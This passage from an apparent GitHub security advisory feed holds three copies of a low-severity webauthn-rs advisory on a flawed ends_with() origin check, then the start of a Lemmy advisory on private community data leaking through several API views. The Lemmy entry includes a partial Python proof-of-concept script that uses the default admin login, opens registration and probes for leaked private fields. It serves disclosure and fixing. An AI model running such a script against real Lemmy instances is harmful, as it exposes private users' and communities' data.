<p><a href="https://doc.rust-lang.org/stable/std/primitive.str.html#method.ends_with"><code>str::ends_with()</code></a> performs a raw string suffix match <em>without</em> <a href="https://html.spec.whatwg.org/multipage/browsers.html#is-a-registrable-domain-suffix-of-or-is-equal-to">enforcing a domain label boundary</a>:</p>
<table>
<thead>
<tr>
<th>Origin</th>
<th>RP ID</th>
<th>Expected result</th>
<th>Result with incorrect <code>ends_with</code> check</th>
</tr>
</thead>
<tbody><tr>
<td><code>hermit-crab.example</code></td>
<td><code>crab.example</code></td>
<td>rejected</td>
<td>accepted <strong>(bug!)</strong></td>
</tr>
<tr>
<td><code>auth.crab.example</code></td>
<td><code>crab.example</code></td>
<td>accepted</td>
<td>accepted (subdomain)</td>
</tr>
<tr>
<td><code>crab.example</code></td>
<td><code>crab.example</code></td>
<td>accepted</td>
<td>accepted (exact match)</td>
</tr>
<tr>
<td><code>hermit-crab.example</code></td>
<td><code>auth.crab.example</code></td>
<td>rejected</td>
<td>rejected</td>
</tr>
<tr>
<td><code>auth.crab.example</code></td>
<td><code>auth.crab.example</code></td>
<td>accepted</td>
<td>accepted (exact match)</td>
</tr>
</tbody></table>
<h3 id="fix">Fix</h3>
<p>When <code>webauthn-rs-core</code> v0.5.5 checks if an <code>Origin</code> is a valid subdomain of an RP ID, it will check that it ends with the RP ID prefixed with a dot (<code>.{rp_id}</code>). <code>webauthn-rs</code> v0.5.5 will be fixed by depending on <code>webauthn-rs-core</code> v0.5.5.</p>
<p><code>webauthn-authenticator-rs</code> v0.5.5 now uses <code>webauthn-rs-core</code>'s checks in <code>WebauthnAuthenticator</code>.</p>
<p>Regression tests for this bug have been added to both libraries.</p>
<h3 id="impact">Impact</h3>
<p>With a <strong>both</strong> a non-conforming <a href="https://www.w3.org/TR/webauthn-3/#client">client</a> implementation and vulnerable version of <code>webauthn-rs-core</code> configured to allow subdomains (not the default), this bug would allow an attacker at <code>hermit-crab.example</code> to phish a target's credential for the RP ID <code>crab.example</code> by directly proxying a legitimate <code>navigator.credentials.get()</code> request on the attacker's domain.</p>
<p>However, <em>conforming</em> <a href="https://www.w3.org/TR/webauthn-3/#client">client implementations</a> (ie: all web browsers) will refuse to process WebAuthn requests for an RP ID that does not match the <code>Origin</code> of the current page and is not <a href="https://www.w3.org/TR/webauthn-3/#sctn-related-origins">a related <code>Origin</code></a>.</p>
<p>In the scenario above with <em>conforming</em> client-side checks, this would force the attacker to change the request's RP ID to <code>hermit-crab.example</code> (the attacker's <code>Origin</code>). This would also change the RP ID hash, <a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L825-L840">and <code>webauthn-rs-core</code> would reject it</a> (per <a href="https://www.w3.org/TR/webauthn-3/#rp-op-verifying-assertion-step-rpid-hash">WebAuthn §7.2 Step 15</a>).</p>
<h3 id="severity">Severity</h3>
<p>Per <a href="https://www.w3.org/TR/webauthn-3/#sctn-validating-origin">WebAuthn §13.4.9</a>:</p>
<blockquote>
<p>The <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a> MUST NOT accept unexpected values of <a href="https://www.w3.org/TR/webauthn-3/#dom-collectedclientdata-origin">origin</a>, as doing so could allow a malicious website to obtain valid <a href="https://www.w3.org/TR/credential-management-1/#concept-credential">credentials</a>. Although the <a href="https://www.w3.org/TR/webauthn-3/#scope">scope</a> of WebAuthn credentials prevents their use on domains outside the <a href="https://www.w3.org/TR/webauthn-3/#rp-id">RP ID</a> they were registered for, the <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a>’s origin validation serves as an additional layer of protection in case a faulty <a href="https://www.w3.org/TR/webauthn-3/#authenticator">authenticator</a> fails to enforce credential <a href="https://www.w3.org/TR/webauthn-3/#scope">scope</a>.</p>
</blockquote>
<p>Unfortunately, <a href="https://www.first.org/cvss/v4.0/user-guide#Vulnerability-Chaining">the chain needed to exploit this bug makes it difficult to classify with the CVSS framework</a>. Kanidm came up with anywhere between "low" and "high" depending on the approach, and GitHub only provides one CVSS field for everything.</p>
<p>An attacker could easily bypass a <em>correctly-implemented</em> server-side <code>Origin</code> check, if they can convince a target to use their authenticator with <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-t-1.3.2">an attacker-controlled client device</a> or <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-t-1.3.1">buggy/malicious client application</a>. FIDO's Security Reference <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-sa-4">assumes that "the FIDO user device and applications involved in a FIDO operation are trustworthy agents of the user"</a>, and violating that <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#discussion">limits the protections FIDO can provide</a>, so it would be ridiculous to describe those bypasses as a "high" severity vulnerability.</p>
<p>However, <code>webauthn-rs-core</code> should take reasonable steps to prevent these sorts of issues where it can, especially when they're part of the WebAuthn specification.</p>
<p>Due to the complex preconditions and non-default configuration required to execute a successful attack, and that it is <em>not exploitable</em> in popular web browsers, Kanidm considers this a <strong>low severity</strong> issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanidm/webauthn-rs/security/advisories/GHSA-22w3-693w-x895">https://github.com/kanidm/webauthn-rs/security/advisories/GHSA-22w3-693w-x895</a></li>
<li><a href="https://github.com/advisories/GHSA-22w3-693w-x895">https://github.com/advisories/GHSA-22w3-693w-x895</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22w3-693w-x895</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-06T23:31:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webauthn-authenticator-rs] webauthn-rs-core/webauthn-authenticator-rs: Origin validation mismatch possible when subdomains are allowed]]></title>
        <id>https://github.com/advisories/GHSA-22w3-693w-x895</id>
        <link href="https://github.com/advisories/GHSA-22w3-693w-x895"/>
        <updated>2026-05-06T23:31:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>webauthn-rs-core</code> (<a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a>) and <code>webauthn-authenticator-rs</code> (<a href="https://www.w3.org/TR/webauthn-3/#client">client</a>) checked that <a href="https://www.w3.org/TR/webauthn-3/#dom-collectedclientdata-origin">an <code>Origin</code> in <code>CollectedClientData</code></a> is valid for <a href="https://www.w3.org/TR/webauthn-3/#rp-id">an RP ID</a> with <a href="https://doc.rust-lang.org/stable/std/primitive.str.html#method.ends_with"><code>str::ends_with()</code></a>, <a href="https://html.spec.whatwg.org/multipage/browsers.html#is-a-registrable-domain-suffix-of-or-is-equal-to">without checking for a dot (<code>.</code>) before the RP ID when allowing subdomains</a>.</p>
<p>This check is flawed, and could allow requests from an attacker-controlled domain such as <code>hermit-crab.example</code> to be accepted for the RP ID <code>crab.example</code> (assuming <code>.example</code> was publicly-registerable TLD) when the RP allows authenticating from a subdomain (disabled by default in <code>webauthn-rs-core</code> and <code>webauthn-rs</code>).</p>
<ul>
<li><p>In <code>webauthn-rs-core</code>, this <strong>only</strong> applies when:</p>
<ul>
<li><a href="https://docs.rs/webauthn-rs-core/0.5.4/webauthn_rs_core/struct.WebauthnCore.html#method.new_unsafe_experts_only"><code>WebauthnCore::allow_subdomains_origin</code></a> is <code>true</code> (the default is <code>false</code>), <em>and</em></li>
<li>the attacker could register a domain that ends with the RP ID as a raw string, <em>and</em>,</li>
<li>the client does not implement these checks correctly either</li>
</ul>
<p><code>webauthn-rs</code> can set <code>allow_subdomains_origin</code> via <a href="https://docs.rs/webauthn-rs/0.5.4/webauthn_rs/struct.WebauthnBuilder.html#method.allow_subdomains"><code>WebauthnBuilder::allow_subdomains</code></a>. Fixing the bug in <code>webauthn-rs-core</code> also fixes it in <code>webauthn-rs</code>.</p>
</li>
<li><p>In <code>webauthn-authenticator-rs</code>, the flawed check is in <a href="https://docs.rs/webauthn-authenticator-rs/0.5.4/webauthn_authenticator_rs/struct.WebauthnAuthenticator.html#method.do_registration"><code>WebauthnAuthenticator::do_registration()</code></a> and <a href="https://docs.rs/webauthn-authenticator-rs/0.5.4/webauthn_authenticator_rs/struct.WebauthnAuthenticator.html#method.do_registration"><code>do_authentication()</code></a>. </p>
<p>A conforming <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a> implementation would reject such requests, but <code>webauthn-rs-core</code> did not.</p>
<p>An application can still provide an incorrect <code>origin</code> parameter to <code>webauthn-authenticator-rs</code>, or use lower-level APIs that bypass these checks entirely, and this is by design.</p>
</li>
</ul>
<p>These issues are a violation of <a href="https://www.w3.org/TR/webauthn-3/#sctn-validating-origin">WebAuthn Level 3 §13.4.9</a>, <a href="https://www.w3.org/TR/webauthn-3/#CreateCred-DetermineRpId">§5.1.3 Step 8</a> and <a href="https://www.w3.org/TR/webauthn-3/#GetAssn-DetermineRpId">§5.1.4.1 Step 7</a>.</p>
<h3 id="details">Details</h3>
<ul>
<li><p><code>webauthn-rs-core/src/core.rs</code> line 1213:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L1211-L1216">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L1211-L1216</a></p>
</li>
<li><p><code>webauthn-authenticator-rs/src/lib.rs</code> line 274:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L274-L277">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L274-L277</a></p>
</li>
<li><p><code>webauthn-authenticator-rs/src/lib.rs</code> line 335:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L335-L338">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L335-L338</a></p>
</li>
</ul>
<p><a href="https://doc.rust-lang.org/stable/std/primitive.str.html#method.ends_with"><code>str::ends_with()</code></a> performs a raw string suffix match <em>without</em> <a href="https://html.spec.whatwg.org/multipage/browsers.html#is-a-registrable-domain-suffix-of-or-is-equal-to">enforcing a domain label boundary</a>:</p>
<table>
<thead>
<tr>
<th>Origin</th>
<th>RP ID</th>
<th>Expected result</th>
<th>Result with incorrect <code>ends_with</code> check</th>
</tr>
</thead>
<tbody><tr>
<td><code>hermit-crab.example</code></td>
<td><code>crab.example</code></td>
<td>rejected</td>
<td>accepted <strong>(bug!)</strong></td>
</tr>
<tr>
<td><code>auth.crab.example</code></td>
<td><code>crab.example</code></td>
<td>accepted</td>
<td>accepted (subdomain)</td>
</tr>
<tr>
<td><code>crab.example</code></td>
<td><code>crab.example</code></td>
<td>accepted</td>
<td>accepted (exact match)</td>
</tr>
<tr>
<td><code>hermit-crab.example</code></td>
<td><code>auth.crab.example</code></td>
<td>rejected</td>
<td>rejected</td>
</tr>
<tr>
<td><code>auth.crab.example</code></td>
<td><code>auth.crab.example</code></td>
<td>accepted</td>
<td>accepted (exact match)</td>
</tr>
</tbody></table>
<h3 id="fix">Fix</h3>
<p>When <code>webauthn-rs-core</code> v0.5.5 checks if an <code>Origin</code> is a valid subdomain of an RP ID, it will check that it ends with the RP ID prefixed with a dot (<code>.{rp_id}</code>). <code>webauthn-rs</code> v0.5.5 will be fixed by depending on <code>webauthn-rs-core</code> v0.5.5.</p>
<p><code>webauthn-authenticator-rs</code> v0.5.5 now uses <code>webauthn-rs-core</code>'s checks in <code>WebauthnAuthenticator</code>.</p>
<p>Regression tests for this bug have been added to both libraries.</p>
<h3 id="impact">Impact</h3>
<p>With a <strong>both</strong> a non-conforming <a href="https://www.w3.org/TR/webauthn-3/#client">client</a> implementation and vulnerable version of <code>webauthn-rs-core</code> configured to allow subdomains (not the default), this bug would allow an attacker at <code>hermit-crab.example</code> to phish a target's credential for the RP ID <code>crab.example</code> by directly proxying a legitimate <code>navigator.credentials.get()</code> request on the attacker's domain.</p>
<p>However, <em>conforming</em> <a href="https://www.w3.org/TR/webauthn-3/#client">client implementations</a> (ie: all web browsers) will refuse to process WebAuthn requests for an RP ID that does not match the <code>Origin</code> of the current page and is not <a href="https://www.w3.org/TR/webauthn-3/#sctn-related-origins">a related <code>Origin</code></a>.</p>
<p>In the scenario above with <em>conforming</em> client-side checks, this would force the attacker to change the request's RP ID to <code>hermit-crab.example</code> (the attacker's <code>Origin</code>). This would also change the RP ID hash, <a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L825-L840">and <code>webauthn-rs-core</code> would reject it</a> (per <a href="https://www.w3.org/TR/webauthn-3/#rp-op-verifying-assertion-step-rpid-hash">WebAuthn §7.2 Step 15</a>).</p>
<h3 id="severity">Severity</h3>
<p>Per <a href="https://www.w3.org/TR/webauthn-3/#sctn-validating-origin">WebAuthn §13.4.9</a>:</p>
<blockquote>
<p>The <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a> MUST NOT accept unexpected values of <a href="https://www.w3.org/TR/webauthn-3/#dom-collectedclientdata-origin">origin</a>, as doing so could allow a malicious website to obtain valid <a href="https://www.w3.org/TR/credential-management-1/#concept-credential">credentials</a>. Although the <a href="https://www.w3.org/TR/webauthn-3/#scope">scope</a> of WebAuthn credentials prevents their use on domains outside the <a href="https://www.w3.org/TR/webauthn-3/#rp-id">RP ID</a> they were registered for, the <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a>’s origin validation serves as an additional layer of protection in case a faulty <a href="https://www.w3.org/TR/webauthn-3/#authenticator">authenticator</a> fails to enforce credential <a href="https://www.w3.org/TR/webauthn-3/#scope">scope</a>.</p>
</blockquote>
<p>Unfortunately, <a href="https://www.first.org/cvss/v4.0/user-guide#Vulnerability-Chaining">the chain needed to exploit this bug makes it difficult to classify with the CVSS framework</a>. Kanidm came up with anywhere between "low" and "high" depending on the approach, and GitHub only provides one CVSS field for everything.</p>
<p>An attacker could easily bypass a <em>correctly-implemented</em> server-side <code>Origin</code> check, if they can convince a target to use their authenticator with <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-t-1.3.2">an attacker-controlled client device</a> or <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-t-1.3.1">buggy/malicious client application</a>. FIDO's Security Reference <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-sa-4">assumes that "the FIDO user device and applications involved in a FIDO operation are trustworthy agents of the user"</a>, and violating that <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#discussion">limits the protections FIDO can provide</a>, so it would be ridiculous to describe those bypasses as a "high" severity vulnerability.</p>
<p>However, <code>webauthn-rs-core</code> should take reasonable steps to prevent these sorts of issues where it can, especially when they're part of the WebAuthn specification.</p>
<p>Due to the complex preconditions and non-default configuration required to execute a successful attack, and that it is <em>not exploitable</em> in popular web browsers, Kanidm considers this a <strong>low severity</strong> issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanidm/webauthn-rs/security/advisories/GHSA-22w3-693w-x895">https://github.com/kanidm/webauthn-rs/security/advisories/GHSA-22w3-693w-x895</a></li>
<li><a href="https://github.com/advisories/GHSA-22w3-693w-x895">https://github.com/advisories/GHSA-22w3-693w-x895</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22w3-693w-x895</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-06T23:31:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[webauthn-rs-core] webauthn-rs-core/webauthn-authenticator-rs: Origin validation mismatch possible when subdomains are allowed]]></title>
        <id>https://github.com/advisories/GHSA-22w3-693w-x895</id>
        <link href="https://github.com/advisories/GHSA-22w3-693w-x895"/>
        <updated>2026-05-06T23:31:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><code>webauthn-rs-core</code> (<a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a>) and <code>webauthn-authenticator-rs</code> (<a href="https://www.w3.org/TR/webauthn-3/#client">client</a>) checked that <a href="https://www.w3.org/TR/webauthn-3/#dom-collectedclientdata-origin">an <code>Origin</code> in <code>CollectedClientData</code></a> is valid for <a href="https://www.w3.org/TR/webauthn-3/#rp-id">an RP ID</a> with <a href="https://doc.rust-lang.org/stable/std/primitive.str.html#method.ends_with"><code>str::ends_with()</code></a>, <a href="https://html.spec.whatwg.org/multipage/browsers.html#is-a-registrable-domain-suffix-of-or-is-equal-to">without checking for a dot (<code>.</code>) before the RP ID when allowing subdomains</a>.</p>
<p>This check is flawed, and could allow requests from an attacker-controlled domain such as <code>hermit-crab.example</code> to be accepted for the RP ID <code>crab.example</code> (assuming <code>.example</code> was publicly-registerable TLD) when the RP allows authenticating from a subdomain (disabled by default in <code>webauthn-rs-core</code> and <code>webauthn-rs</code>).</p>
<ul>
<li><p>In <code>webauthn-rs-core</code>, this <strong>only</strong> applies when:</p>
<ul>
<li><a href="https://docs.rs/webauthn-rs-core/0.5.4/webauthn_rs_core/struct.WebauthnCore.html#method.new_unsafe_experts_only"><code>WebauthnCore::allow_subdomains_origin</code></a> is <code>true</code> (the default is <code>false</code>), <em>and</em></li>
<li>the attacker could register a domain that ends with the RP ID as a raw string, <em>and</em>,</li>
<li>the client does not implement these checks correctly either</li>
</ul>
<p><code>webauthn-rs</code> can set <code>allow_subdomains_origin</code> via <a href="https://docs.rs/webauthn-rs/0.5.4/webauthn_rs/struct.WebauthnBuilder.html#method.allow_subdomains"><code>WebauthnBuilder::allow_subdomains</code></a>. Fixing the bug in <code>webauthn-rs-core</code> also fixes it in <code>webauthn-rs</code>.</p>
</li>
<li><p>In <code>webauthn-authenticator-rs</code>, the flawed check is in <a href="https://docs.rs/webauthn-authenticator-rs/0.5.4/webauthn_authenticator_rs/struct.WebauthnAuthenticator.html#method.do_registration"><code>WebauthnAuthenticator::do_registration()</code></a> and <a href="https://docs.rs/webauthn-authenticator-rs/0.5.4/webauthn_authenticator_rs/struct.WebauthnAuthenticator.html#method.do_registration"><code>do_authentication()</code></a>. </p>
<p>A conforming <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a> implementation would reject such requests, but <code>webauthn-rs-core</code> did not.</p>
<p>An application can still provide an incorrect <code>origin</code> parameter to <code>webauthn-authenticator-rs</code>, or use lower-level APIs that bypass these checks entirely, and this is by design.</p>
</li>
</ul>
<p>These issues are a violation of <a href="https://www.w3.org/TR/webauthn-3/#sctn-validating-origin">WebAuthn Level 3 §13.4.9</a>, <a href="https://www.w3.org/TR/webauthn-3/#CreateCred-DetermineRpId">§5.1.3 Step 8</a> and <a href="https://www.w3.org/TR/webauthn-3/#GetAssn-DetermineRpId">§5.1.4.1 Step 7</a>.</p>
<h3 id="details">Details</h3>
<ul>
<li><p><code>webauthn-rs-core/src/core.rs</code> line 1213:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L1211-L1216">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L1211-L1216</a></p>
</li>
<li><p><code>webauthn-authenticator-rs/src/lib.rs</code> line 274:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L274-L277">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L274-L277</a></p>
</li>
<li><p><code>webauthn-authenticator-rs/src/lib.rs</code> line 335:</p>
<p><a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L335-L338">https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-authenticator-rs/src/lib.rs#L335-L338</a></p>
</li>
</ul>
<p><a href="https://doc.rust-lang.org/stable/std/primitive.str.html#method.ends_with"><code>str::ends_with()</code></a> performs a raw string suffix match <em>without</em> <a href="https://html.spec.whatwg.org/multipage/browsers.html#is-a-registrable-domain-suffix-of-or-is-equal-to">enforcing a domain label boundary</a>:</p>
<table>
<thead>
<tr>
<th>Origin</th>
<th>RP ID</th>
<th>Expected result</th>
<th>Result with incorrect <code>ends_with</code> check</th>
</tr>
</thead>
<tbody><tr>
<td><code>hermit-crab.example</code></td>
<td><code>crab.example</code></td>
<td>rejected</td>
<td>accepted <strong>(bug!)</strong></td>
</tr>
<tr>
<td><code>auth.crab.example</code></td>
<td><code>crab.example</code></td>
<td>accepted</td>
<td>accepted (subdomain)</td>
</tr>
<tr>
<td><code>crab.example</code></td>
<td><code>crab.example</code></td>
<td>accepted</td>
<td>accepted (exact match)</td>
</tr>
<tr>
<td><code>hermit-crab.example</code></td>
<td><code>auth.crab.example</code></td>
<td>rejected</td>
<td>rejected</td>
</tr>
<tr>
<td><code>auth.crab.example</code></td>
<td><code>auth.crab.example</code></td>
<td>accepted</td>
<td>accepted (exact match)</td>
</tr>
</tbody></table>
<h3 id="fix">Fix</h3>
<p>When <code>webauthn-rs-core</code> v0.5.5 checks if an <code>Origin</code> is a valid subdomain of an RP ID, it will check that it ends with the RP ID prefixed with a dot (<code>.{rp_id}</code>). <code>webauthn-rs</code> v0.5.5 will be fixed by depending on <code>webauthn-rs-core</code> v0.5.5.</p>
<p><code>webauthn-authenticator-rs</code> v0.5.5 now uses <code>webauthn-rs-core</code>'s checks in <code>WebauthnAuthenticator</code>.</p>
<p>Regression tests for this bug have been added to both libraries.</p>
<h3 id="impact">Impact</h3>
<p>With a <strong>both</strong> a non-conforming <a href="https://www.w3.org/TR/webauthn-3/#client">client</a> implementation and vulnerable version of <code>webauthn-rs-core</code> configured to allow subdomains (not the default), this bug would allow an attacker at <code>hermit-crab.example</code> to phish a target's credential for the RP ID <code>crab.example</code> by directly proxying a legitimate <code>navigator.credentials.get()</code> request on the attacker's domain.</p>
<p>However, <em>conforming</em> <a href="https://www.w3.org/TR/webauthn-3/#client">client implementations</a> (ie: all web browsers) will refuse to process WebAuthn requests for an RP ID that does not match the <code>Origin</code> of the current page and is not <a href="https://www.w3.org/TR/webauthn-3/#sctn-related-origins">a related <code>Origin</code></a>.</p>
<p>In the scenario above with <em>conforming</em> client-side checks, this would force the attacker to change the request's RP ID to <code>hermit-crab.example</code> (the attacker's <code>Origin</code>). This would also change the RP ID hash, <a href="https://github.com/kanidm/webauthn-rs/blob/197cddf8487a2dbdd5d374e50d80aa1e4682f3ab/webauthn-rs-core/src/core.rs#L825-L840">and <code>webauthn-rs-core</code> would reject it</a> (per <a href="https://www.w3.org/TR/webauthn-3/#rp-op-verifying-assertion-step-rpid-hash">WebAuthn §7.2 Step 15</a>).</p>
<h3 id="severity">Severity</h3>
<p>Per <a href="https://www.w3.org/TR/webauthn-3/#sctn-validating-origin">WebAuthn §13.4.9</a>:</p>
<blockquote>
<p>The <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a> MUST NOT accept unexpected values of <a href="https://www.w3.org/TR/webauthn-3/#dom-collectedclientdata-origin">origin</a>, as doing so could allow a malicious website to obtain valid <a href="https://www.w3.org/TR/credential-management-1/#concept-credential">credentials</a>. Although the <a href="https://www.w3.org/TR/webauthn-3/#scope">scope</a> of WebAuthn credentials prevents their use on domains outside the <a href="https://www.w3.org/TR/webauthn-3/#rp-id">RP ID</a> they were registered for, the <a href="https://www.w3.org/TR/webauthn-3/#relying-party">Relying Party</a>’s origin validation serves as an additional layer of protection in case a faulty <a href="https://www.w3.org/TR/webauthn-3/#authenticator">authenticator</a> fails to enforce credential <a href="https://www.w3.org/TR/webauthn-3/#scope">scope</a>.</p>
</blockquote>
<p>Unfortunately, <a href="https://www.first.org/cvss/v4.0/user-guide#Vulnerability-Chaining">the chain needed to exploit this bug makes it difficult to classify with the CVSS framework</a>. Kanidm came up with anywhere between "low" and "high" depending on the approach, and GitHub only provides one CVSS field for everything.</p>
<p>An attacker could easily bypass a <em>correctly-implemented</em> server-side <code>Origin</code> check, if they can convince a target to use their authenticator with <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-t-1.3.2">an attacker-controlled client device</a> or <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-t-1.3.1">buggy/malicious client application</a>. FIDO's Security Reference <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#dfn-sa-4">assumes that "the FIDO user device and applications involved in a FIDO operation are trustworthy agents of the user"</a>, and violating that <a href="https://fidoalliance.org/specs/common-specs/fido-security-ref-v2.1-ps-20220523.html#discussion">limits the protections FIDO can provide</a>, so it would be ridiculous to describe those bypasses as a "high" severity vulnerability.</p>
<p>However, <code>webauthn-rs-core</code> should take reasonable steps to prevent these sorts of issues where it can, especially when they're part of the WebAuthn specification.</p>
<p>Due to the complex preconditions and non-default configuration required to execute a successful attack, and that it is <em>not exploitable</em> in popular web browsers, Kanidm considers this a <strong>low severity</strong> issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kanidm/webauthn-rs/security/advisories/GHSA-22w3-693w-x895">https://github.com/kanidm/webauthn-rs/security/advisories/GHSA-22w3-693w-x895</a></li>
<li><a href="https://github.com/advisories/GHSA-22w3-693w-x895">https://github.com/advisories/GHSA-22w3-693w-x895</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-22w3-693w-x895</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-05-06T23:31:27.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[lemmy_api] Lemmy may expose private community data through community, saved, liked, and modlog API views]]></title>
        <id>https://github.com/advisories/GHSA-95q8-x6r6-672m</id>
        <link href="https://github.com/advisories/GHSA-95q8-x6r6-672m"/>
        <updated>2026-05-06T22:22:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Lemmy applies private-community checks in <code>PostView</code> and <code>CommentView</code>, but several adjacent API views skip the accepted-follower filter. Bob, a registered user who is not an accepted follower, can read private community <code>sidebar</code> and <code>summary</code> fields. Alice, a former accepted follower, can still read saved and liked private post bodies after she leaves. An unauthenticated visitor can read private community metadata and removed private post names through the modlog.</p>
<h2 id="details">Details</h2>
<p><code>CommunityView::read()</code> and <code>CommunityQuery::list()</code> call <code>visible_communities_only()</code>, but they do not add the private-community filter used by post and comment reads:</p>
<pre><code class="language-rust">query = my_local_user.visible_communities_only(query);
query.first(conn).await.with_lemmy_type(LemmyErrorType::NotFound)
</code></pre>
<p><code>PersonSavedCombinedQuery::list()</code> and <code>PersonLikedCombinedQuery::list()</code> join <code>community_actions</code>, but they only filter by the requesting person id. They do not require <code>community_actions.follow_state = Accepted</code> when the community has <code>visibility = Private</code>.</p>
<p>The modlog query returns <code>ListingType::All</code> without a visibility predicate:</p>
<pre><code class="language-rust">query = match self.listing_type.unwrap_or(ListingType::All) {
  ListingType::All =&gt; query,
</code></pre>
<p>The control paths show the expected check. <code>PostView::read()</code> and <code>CommentView::read()</code> both filter private communities to accepted followers:</p>
<pre><code class="language-rust">community::visibility
  .ne(CommunityVisibility::Private)
  .or(community_actions::follow_state.eq(CommunityFollowerState::Accepted))
</code></pre>
<h2 id="proof-of-concept">Proof of Concept</h2>
<p>The following script reproduces the leak against a fresh Lemmy instance. Tested against <code>dessalines/lemmy:nightly</code> with the default setup account from the sample config. The script opens registration so it can create Alice and Bob.</p>
<pre><code class="language-python">import requests, random, string

BASE = "http://127.0.0.1:8536/api/v4"  # change to the target Lemmy URL
ADMIN_USER = "lemmy"
ADMIN_PASS = "lemmylemmy"
PASSWORD = "Password123456!"

def req(method, path, token=None, params=None, **body):
    headers = {}
    if token:
        headers["Authorization"] = "Bearer " + token
    return requests.request(method, BASE + path, headers=headers, params=params, json=body or None)

def register(name):
    r = req("POST", "/account/auth/register", username=name, password=PASSWORD,
            password_verify=PASSWORD, email=name + "@example.test")
    r.raise_for_status()
    token = r.json()["jwt"]
    person_id = req("GET", "/account", token).json()["local_user_view"]["person"]["id"]
    return token, person_id

def show(label, response, marker):
    text = response.text
    print("\n" + label + ": HTTP", response.status_code)
    print(text[:700])
    print("contains marker:", marker in text)

suffix = "poc" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
admin = req("POST", "/account/auth/login", username_or_email=ADMIN_USER, password=ADMIN_PASS).json()["jwt"]
req("PUT", "/site", admin, registration_mode="open", email_verification_required=False)

alice, alice_id = register("alice" + suffix)
bob, _ = register("bob" + suffix)
secret = "SECRET_" + suffix

community = req("POST", "/community", admin,
                name="priv" + suffix,
                title="Private Proof " + suffix,
                sidebar=secret + " sidebar",
                summary=secret + " summary",
                visibility="private").json()["community_view"]["community"]
